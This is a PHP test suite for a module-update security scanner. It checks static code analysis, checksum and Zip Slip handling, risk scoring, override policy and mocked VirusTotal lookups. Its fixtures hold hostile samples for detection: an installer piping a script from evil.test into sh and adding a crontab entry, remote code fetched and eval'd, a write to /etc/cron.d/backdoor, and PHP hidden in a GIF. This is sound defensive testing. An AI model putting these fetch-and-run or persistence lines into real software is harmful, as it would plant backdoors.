<?php

use Modules\UpdateGuard\Services\Security\CodeAnalyzer;
use Modules\UpdateGuard\Services\Security\RiskScore;
use Modules\UpdateGuard\Services\Security\Rules;
use Modules\UpdateGuard\Services\Security\ScanCache;
use Modules\UpdateGuard\Services\Security\ScanResult;
use Modules\UpdateGuard\Services\Security\SecurityGate;
use Modules\UpdateGuard\Services\Security\VirusTotalScanner;
use Modules\UpdateGuard\Services\ZipInspector;

/*
 * Security Gate. External providers are always mocked: no test contacts VirusTotal or any other service.
 */

/** Default settings of Config/config.php, with overrides. */
function ug_settings(array $override = [])
{
    $config = require __DIR__.'/../../UpdateGuard/Config/config.php';

    return array_merge($config['defaults'], $override);
}

/** Module folder with the given PHP code in Services/Code.php (and extra files). */
function ug_module_with($code, array $files = [])
{
    return fakemodule('ScanModule', [], array_merge(['Services/Code.php' => "<?php\n\nnamespace Modules\\ScanModule\\Services;\n\n".$code."\n"], $files));
}

function ug_rules(array $findings)
{
    $rules = array_values(array_unique(array_column($findings, 'rule')));
    sort($rules);

    return $rules;
}

function ug_scan($dir, array $override = [], array $ctx = [], array $providers = [], $cache = null, array $decisions = [], $automatic = false)
{
    return SecurityGate::run(array_merge([
        'module' => 'ScanModule', 'from' => '1.0.0', 'to' => '1.1.0', 'source' => 'https://example.test/ScanModule.zip',
        'zip' => '', 'staged' => $dir, 'sha256' => str_repeat('a', 64), 'integrity' => 'VERIFIED', 'structure_errors' => [],
    ], $ctx), ug_settings($override), $providers, $cache, $decisions, $automatic);
}

/** Mocked HTTP client for VirusTotal: [url-substring => [status, body]] answered in order of declaration. */
function ug_http(array $routes, ?array &$calls = null)
{
    $calls = [];

    return function ($method, $url, array $options) use ($routes, &$calls) {
        $calls[] = $method.' '.$url;
        foreach ($routes as $needle => $answer) {
            if (strpos($method.' '.$url, $needle) !== false) {
                if ($answer instanceof \Throwable) {
                    throw $answer;
                }

                return ['status' => $answer[0], 'body' => is_array($answer[1]) ? json_encode($answer[1]) : (string) $answer[1]];
            }
        }

        return ['status' => 500, 'body' => ''];
    };
}

function ug_vt_stats($malicious, $suspicious = 0)
{
    return ['data' => ['attributes' => ['last_analysis_stats' => ['malicious' => $malicious, 'suspicious' => $suspicious, 'harmless' => 12, 'undetected' => 55]]]];
}

// --------------------------------------------------------------------------------------------- local analysis

test('security: a safe PHP module has no finding (LOW, allowed)', function () {
    $dir = ug_module_with(<<<'PHP'
class Code
{
    /** eval( exec( system( in a comment are not calls */
    public function run()
    {
        $text = 'shell_exec( is only text here';
        $this->exec();               // a method, not PHP's exec()
        file_put_contents(storage_path('scanmodule/cache.json'), json_encode([1]));
        assert($a === $b);
        return base_path('Modules/ScanModule/Public');
    }
}
PHP
    );
    $r = ug_scan($dir);
    same([], $r['findings'], 'no finding');
    same(0, $r['score']);
    same('LOW', $r['level']);
    same('allowed', $r['decision']);
    same('PASS', $r['checks']['php']['status']);
});

test('security: eval(base64_decode()) is HIGH, base64_decode alone is LOW', function () {
    $r = ug_scan(ug_module_with('eval(base64_decode($payload));'));
    check(in_array('eval_decode', ug_rules($r['findings']), true), 'eval_decode found');
    same('HIGH', $r['level'], 'score '.$r['score']);
    same(65, $r['score'], 'eval+decode 60 + base64 5');
    $r = ug_scan(ug_module_with('$x = base64_decode($data);'));
    same(['base64_decode'], ug_rules($r['findings']));
    same('LOW', $r['level']);
    same('allowed', $r['decision']);
});

test('security: shell_exec() is a MEDIUM finding, not malware by itself', function () {
    $r = ug_scan(ug_module_with('$out = shell_exec("git --version");'));
    same(['command_exec'], ug_rules($r['findings']));
    same('MEDIUM', $r['findings'][0]['severity']);
    same(20, $r['score']);
    same('LOW', $r['level']);
    same('allowed', $r['decision'], 'manual update, confirmation mode "warnings": LOW does not ask');
    $r = ug_scan(ug_module_with('$out = `ls -la`;'));
    same(['backtick'], ug_rules($r['findings']));
});

test('security: writes outside the module directory', function () {
    $cases = [
        'system_path_write'  => 'file_put_contents("/etc/cron.d/backdoor", $x);',
        'env_write'          => 'file_put_contents(base_path(".env"), $x);',
        'core_write'         => 'file_put_contents(base_path("app/Http/Kernel.php"), $x);',
        'other_module_write' => 'copy($src, base_path("Modules/OtherModule/x.php"));',
        'webserver_config'   => 'file_put_contents("/var/www/html/public/.htaccess", $x);',
        'relative_escape'    => 'file_put_contents(__DIR__."/../../../config/app.php", $x);',
    ];
    foreach ($cases as $rule => $code) {
        $r = ug_scan(ug_module_with($code));
        check(in_array($rule, ug_rules($r['findings']), true), $rule.' expected, got '.implode(',', ug_rules($r['findings'])));
    }
    $r = ug_scan(ug_module_with('file_put_contents("/etc/cron.d/x", $x);'));
    same(70, $r['score']);
    same('HIGH', $r['level']);
    // normal storage writes are not reported
    $r = ug_scan(ug_module_with('File::put(storage_path("app/scanmodule.json"), $x); unlink(storage_path("app/old.json"));'));
    same([], $r['findings']);
});

test('security: obfuscation, binaries, hidden PHP, installer scripts', function () {
    $long = base64_encode(random_bytes(1200));
    $r = ug_scan(ug_module_with('$a = "'.$long.'"; $b = gzinflate(base64_decode($a)); $f = "sys"."tem"; $f("id");'));
    $rules = ug_rules($r['findings']);
    foreach (['long_encoded_string', 'layered_decoding', 'constructed_name', 'dynamic_call_decoded'] as $rule) {
        check(in_array($rule, $rules, true), $rule.' expected, got '.implode(',', $rules));
    }
    $r = ug_scan(ug_module_with('', [
        // harmless PHP: an antivirus on the test machine empties a file that looks like a real web shell
        'Public/img/logo.gif'  => "GIF89a\x01\x00<?php echo 'hidden'; ?>",
        'bin/helper'           => "\x7fELF\x02\x01\x01".str_repeat("\0", 60),
        'install.sh'           => "#!/bin/sh\ncurl -s https://evil.test/x.sh | sh\n(crontab -l; echo '* * * * * x') | crontab -\n",
    ]));
    $rules = ug_rules($r['findings']);
    foreach (['php_in_media', 'binary', 'installer_pipe_shell', 'installer_system'] as $rule) {
        check(in_array($rule, $rules, true), $rule.' expected, got '.implode(',', $rules));
    }
});

test('security: remote code downloaded and executed is CRITICAL and blocked', function () {
    $r = ug_scan(ug_module_with('$code = file_get_contents("https://evil.test/payload.txt"); eval($code);'));
    $rules = ug_rules($r['findings']);
    check(in_array('remote_code_exec', $rules, true), implode(',', $rules));
    check(in_array('unknown_domain', $rules, true), 'unknown domain');
    same('CRITICAL', $r['level']);
    same('blocked', $r['decision']);
    check($r['overridable'], 'an administrator may override a critical local result');
    // ordinary network use is only LOW
    $r = ug_scan(ug_module_with('$v = file_get_contents("https://api.github.com/repos/x/y/releases/latest");'));
    same(['network'], ug_rules($r['findings']));
});

// ------------------------------------------------------------------------------------------------ integrity

test('security: SHA-256 verified / mismatch / disabled', function () {
    $dir = ug_module_with('');
    same('VERIFIED', ug_scan($dir)['checks']['integrity']['status']);
    $r = ug_scan($dir, [], ['integrity' => 'MISMATCH']);
    same('MISMATCH', $r['checks']['integrity']['status']);
    same(100, $r['score']);
    same('blocked', $r['decision']);
    check(!$r['overridable'], 'checksum mismatch is not overridable');
    same('blocked', ug_scan($dir, [], ['integrity' => 'MISMATCH'], [], null, ['override'])['decision'], 'override refused');
    same('DISABLED', ug_scan($dir, ['sec_check_integrity' => false], ['integrity' => 'MISMATCH'])['checks']['integrity']['status']);
    same('NOT AVAILABLE', ug_scan($dir, [], ['integrity' => 'NOT AVAILABLE'])['checks']['integrity']['status']);
});

test('security: Zip Slip archive is refused, never extracted, not overridable', function () {
    $zip = makezip(['ScanModule/module.json' => '{}', 'ScanModule/../../../../tmp/evil.php' => '<?php']);
    $inspection = ZipInspector::inspect($zip);
    check(!$inspection['ok'], 'refused');
    $r = ug_scan('', [], ['zip' => $zip, 'staged' => '', 'structure_errors' => $inspection['errors']]);
    same('FAIL', $r['checks']['structure']['status']);
    same('NOT AVAILABLE', $r['checks']['php']['status'], 'nothing scanned: nothing extracted');
    same('blocked', $r['decision']);
    check(!$r['overridable'], 'unsafe archive not overridable');
    check(in_array('archive_traversal', ug_rules($r['findings']), true), 'traversal rule');
    $dup = ZipInspector::inspect(makezip(['ScanModule/module.json' => '{}', 'ScanModule/A.php' => '1', 'ScanModule/a.php' => '2']));
    check(!$dup['ok'] && strpos(implode(' ', $dup['errors']), 'duplicate') !== false, 'case conflict refused');
});

// ------------------------------------------------------------------------------------------- score & policy

test('security: score calculation (once per rule, family ceilings, thresholds)', function () {
    $f = function ($rule) {
        return Rules::finding($rule);
    };
    same(0, RiskScore::compute([])['score']);
    same(5, RiskScore::compute([$f('base64_decode'), $f('base64_decode'), $f('base64_decode')])['score'], 'counted once');
    $r = RiskScore::compute([$f('long_encoded_string'), $f('layered_decoding'), $f('hex_encoded_code')]);
    same(50, $r['score'], 'obfuscation capped at 50');
    same('HIGH', $r['level']);
    same(100, RiskScore::compute([$f('checksum_mismatch'), $f('system_path_write')])['score'], 'capped at 100');
    same('LOW', RiskScore::level(20));
    same('MEDIUM', RiskScore::level(21));
    same('HIGH', RiskScore::level(79));
    same('CRITICAL', RiskScore::level(80));
    same('MEDIUM', RiskScore::level(79, ['high' => 90, 'critical' => 95]), 'configurable thresholds');
});

test('security: disabled checks and disabled gate rules', function () {
    $dir = ug_module_with('eval(base64_decode($p)); shell_exec($c);');
    $off = [];
    foreach (['php', 'obfuscation', 'executables', 'filesystem', 'network', 'installer'] as $c) {
        $off['sec_check_'.$c] = false;
    }
    $r = ug_scan($dir, $off);
    same([], $r['findings']);
    same('DISABLED', $r['checks']['php']['status']);
    // critical local result but the blocking rule is off
    $dir = ug_module_with('$c = file_get_contents("https://evil.test/p"); eval($c);');
    same('blocked', ug_scan($dir)['decision']);
    same('allowed', ug_scan($dir, ['sec_block_critical_local' => false, 'sec_block_score' => false, 'sec_confirm' => 'never'])['decision']);
});

test('security: administrator override (allowed only when enabled, never for automatic updates)', function () {
    $dir = ug_module_with('$c = file_get_contents("https://evil.test/p"); eval($c);');
    $r = ug_scan($dir, [], [], [], null, ['override']);
    same('allowed', $r['decision']);
    check($r['overridden'], 'recorded as overridden');
    $r = ug_scan($dir, ['sec_allow_override' => false], [], [], null, ['override']);
    same('blocked', $r['decision']);
    check(!$r['overridable'], 'override disabled');
    $r = ug_scan($dir, [], [], [], null, ['override'], true);
    same('blocked', $r['decision'], 'automatic update');
});

test('security: confirmation before a manual update with warnings', function () {
    $dir = ug_module_with('$x = file_get_contents("https://evil.test/a"); $y = shell_exec($x);');
    $r = ug_scan($dir);
    same('MEDIUM', $r['level'], 'score '.$r['score']);
    same('confirm', $r['decision']);
    same('allowed', ug_scan($dir, [], [], [], null, ['continue'])['decision']);
    same('allowed', ug_scan($dir, [], [], [], null, [], true)['decision'], 'automatic: no question');
    same('allowed', ug_scan($dir, ['sec_confirm' => 'never'])['decision']);
    same('confirm', ug_scan(ug_module_with(''), ['sec_confirm' => 'always'])['decision']);
});

// ------------------------------------------------------------------------------------------------ VirusTotal

test('VirusTotal: known clean hash, malicious result, thresholds', function () {
    $sha = str_repeat('a', 64);
    $vt = new VirusTotalScanner('key', ug_http(['GET https://www.virustotal.com/api/v3/files/'.$sha => [200, ug_vt_stats(0)]], $calls));
    $r = $vt->lookupHash($sha);
    same(ScanResult::PASS, $r->status);
    same(55, $r->stats['undetected']);
    same(['GET https://www.virustotal.com/api/v3/files/'.$sha], $calls, 'only the hash is sent');
    $warn = (new VirusTotalScanner('key', ug_http(['/files/' => [200, ug_vt_stats(1)]])))->lookupHash($sha);
    same(ScanResult::WARNING, $warn->status, 'one detection does not block');
    $high = (new VirusTotalScanner('key', ug_http(['/files/' => [200, ug_vt_stats(4)]])))->lookupHash($sha);
    same([ScanResult::BLOCKED, 'HIGH'], [$high->status, $high->level]);
    $crit = (new VirusTotalScanner('key', ug_http(['/files/' => [200, ug_vt_stats(7)]])))->lookupHash($sha);
    same('CRITICAL', $crit->level);
    $custom = (new VirusTotalScanner('key', ug_http(['/files/' => [200, ug_vt_stats(4)]]), ['block' => 10]))->lookupHash($sha);
    same(ScanResult::WARNING, $custom->status, 'configurable block threshold');

    $r = ug_scan(ug_module_with(''), ['vt_enabled' => true], [], [new VirusTotalScanner('key', ug_http(['/files/' => [200, ug_vt_stats(7)]]))]);
    same('BLOCKED', $r['external']['VirusTotal']['status']);
    same('blocked', $r['decision']);
    check(in_array('external_critical', ug_rules($r['findings']), true), 'external finding');
});

test('VirusTotal: unknown hash asks before upload; never uploads silently', function () {
    $sha = str_repeat('b', 64);
    $zip = makezip(['ScanModule/module.json' => '{}']);
    $http = ug_http(['GET https://www.virustotal.com/api/v3/files/' => [404, ''], 'POST' => [200, ['data' => ['id' => 'abc']]],
        '/analyses/abc' => [200, ['data' => ['attributes' => ['status' => 'completed', 'stats' => ['malicious' => 0, 'undetected' => 60]]]]]], $calls);
    $vt = new VirusTotalScanner('key', $http);
    $vt->sleep = function () {
    };
    $r = ug_scan(ug_module_with(''), [], ['zip' => $zip, 'sha256' => $sha], [$vt]);
    same('upload_consent', $r['decision']);
    same(true, $r['external']['VirusTotal']['unknown']);
    check(!preg_grep('/^POST/', $calls), 'nothing uploaded without consent');
    // automatic update: never asks, never uploads
    $r = ug_scan(ug_module_with(''), [], ['zip' => $zip, 'sha256' => $sha], [$vt], null, [], true);
    same('allowed', $r['decision']);
    check(!preg_grep('/^POST/', $calls), 'still nothing uploaded');
    // the administrator agreed
    $r = ug_scan(ug_module_with(''), [], ['zip' => $zip, 'sha256' => $sha], [$vt], null, ['upload']);
    same('PASS', $r['external']['VirusTotal']['status']);
    check((bool) preg_grep('/^POST/', $calls), 'uploaded after consent');
    same('allowed', $r['decision']);
    // the administrator refused: continue without upload
    same('allowed', ug_scan(ug_module_with(''), [], ['zip' => $zip, 'sha256' => $sha], [$vt], null, ['skip_upload'])['decision']);
});

test('VirusTotal: timeout / errors never crash UpdateGuard; policy decides', function () {
    $sha = str_repeat('c', 64);
    $down = new VirusTotalScanner('key', ug_http(['/files/' => new \RuntimeException('cURL error 28: Operation timed out')]));
    $r = $down->lookupHash($sha);
    same(ScanResult::ERROR, $r->status);
    check(strpos($r->message, 'timed out') !== false, $r->message);
    $report = ug_scan(ug_module_with(''), [], [], [$down]);
    same('ERROR', $report['external']['VirusTotal']['status']);
    same('confirm', $report['decision'], 'default: continue with a warning (manual update asks)');
    same('allowed', ug_scan(ug_module_with(''), [], [], [$down], null, [], true)['decision'], 'automatic: continue with warning');
    same('blocked', ug_scan(ug_module_with(''), ['vt_on_failure' => 'block'], [], [$down])['decision'], 'On VirusTotal failure: block');
    same('blocked', ug_scan(ug_module_with(''), ['sec_block_external_unavailable' => true], [], [$down])['decision']);
    same(2, SecurityGate::exitCode(ug_scan(ug_module_with(''), [], [], [$down])), 'exit code 2 = scanner error');
    $bad = (new VirusTotalScanner('key', ug_http(['/files/' => [401, '']])))->lookupHash($sha);
    same('invalid API key', $bad->message);
    same(false, (new VirusTotalScanner('', ug_http([])))->testConnection()->ok);
    same(true, (new VirusTotalScanner('key', ug_http(['/files/' => [404, '']])))->testConnection()->ok);
});

test('VirusTotal: results cached by SHA-256 + provider', function () {
    $sha = str_repeat('d', 64);
    $cache = new ScanCache(tmpdir('cache'), 7);
    $vt = new VirusTotalScanner('key', ug_http(['/files/' => [200, ug_vt_stats(0)]], $calls));
    ug_scan(ug_module_with(''), [], ['sha256' => $sha], [$vt], $cache);
    $r = ug_scan(ug_module_with(''), [], ['sha256' => $sha], [$vt], $cache);
    same(1, count($calls), 'second scan from the cache');
    same(true, $r['external']['VirusTotal']['cached']);
    $cache->clock = function () {
        return time() + 8 * 86400;
    };
    same(null, $cache->get('VirusTotal', $sha), 'expired after 7 days');
    $cache->put('VirusTotal', $sha, ScanResult::make('VirusTotal', ScanResult::ERROR, 'x'));
    same(null, (new ScanCache(tmpdir('cache2'), 7))->get('VirusTotal', $sha), 'errors are not cached');
});

// ---------------------------------------------------------------------------------------------------- output

test('security: CLI text, JSON and exit codes', function () {
    $r = ug_scan(ug_module_with('$out = shell_exec("x");'));
    $text = SecurityGate::toText($r);
    foreach (['Scanning ScanModule 1.1.0', 'SHA256 ....', 'PASS', 'Risk score: 20 / 100', 'Result: PASS', '[MEDIUM]'] as $needle) {
        check(strpos($text, $needle) !== false, 'text contains '.$needle);
    }
    $json = json_decode(SecurityGate::toJson($r), true);
    same('updateguard-security/1', $json['format']);
    same(20, $json['score']);
    same('VERIFIED', $json['checks']['integrity']['status']);
    same(0, SecurityGate::exitCode($r));
    same(1, SecurityGate::exitCode(ug_scan(ug_module_with('$c = file_get_contents("https://evil.test/p"); eval($c);'))));
});

test('security: report contains what is needed (module, versions, source, sha256, scanners, findings, score)', function () {
    $r = ug_scan(ug_module_with('$x = base64_decode($y);'));
    foreach (['module', 'from', 'to', 'source', 'sha256', 'enabled', 'checks', 'external', 'findings', 'score', 'level', 'decision', 'reasons', 'overridable', 'overridden'] as $key) {
        check(array_key_exists($key, $r), 'report key '.$key);
    }
    same('ScanModule', $r['module']);
    check(in_array('php', $r['enabled'], true), 'enabled scanners listed');
    same('Services/Code.php', $r['findings'][0]['file']);
    same(5, $r['findings'][0]['line']);
});
